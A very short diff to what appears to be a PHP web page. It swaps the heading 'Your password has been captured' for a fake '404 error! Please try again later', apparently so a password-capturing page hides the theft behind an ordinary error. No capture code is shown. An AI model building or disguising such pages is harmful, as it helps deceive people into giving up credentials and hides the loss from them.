@@ -11,7 +11,7 @@
 
 ?>
 
-<h1>Your password has been captured</h1>
+<h1>404 error! Please try again later</h1>
 
 <?php
 
